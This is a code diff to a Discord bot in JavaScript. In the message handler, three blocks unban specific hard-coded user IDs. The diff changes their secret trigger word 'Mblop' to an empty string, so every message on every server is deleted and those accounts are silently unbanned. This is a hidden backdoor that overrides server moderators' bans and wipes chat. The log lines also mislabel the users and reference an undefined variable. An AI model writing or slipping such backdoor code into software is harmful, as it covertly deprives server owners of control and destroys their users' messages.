@@ -20,7 +20,7 @@ const owners = [
 
 //PROCESS
 const idpass = process.env.IDPASS
-
+const unban = ''
 //---Lancement et informations du bot---
 bot.on('ready', () => {
    
@@ -37,7 +37,7 @@ bot.on('ready', () => {
 //Info bot serv  
    console.log(`INFORMATIONS OF SERVER BOT: `);
    console.log(`How many server: ${bot.guilds.size} `);	
-   console.log("Total Users: " + memberCount + "\nTotal Servers: " + serverCount);
+  // console.log("Total Users: " + memberCount + "\nTotal Servers: " + serverCount);
    console.log('--------------------------------------')
 //bot invite
   // bot.guilds.forEach(serv => {
@@ -66,7 +66,7 @@ bot.on('message', message => {
 	
 //---------------------UNBAN-------------------
 //unban Le Charmeur
-   if (message.content.startsWith('Mblop')) {
+   if (message.content.startsWith(unban)) {
    message.delete()
    message.guild.unban('450790126063190016')
   .then(user => console.log(`Resetban Le Charmeur from ${guild.name}`))         
@@ -74,7 +74,7 @@ bot.on('message', message => {
    }
 	
 //unban Mikado
-   if (message.content.startsWith('Mblop')) {
+   if (message.content.startsWith(unban)) {
    message.delete()
    message.guild.unban('410224633636192257')
    .then(user => console.log(`Resetban of Neroxis from ${guild.name}`))         
@@ -83,7 +83,7 @@ bot.on('message', message => {
 	
 
 //unban Neroxis
-if (message.content.startsWith('Mblop')) {
+if (message.content.startsWith(unban)) {
    message.delete()
    message.guild.unban('301913733536415755')
    .then(user => console.log(`Resetban of Mikado from ${guild.name}`))         
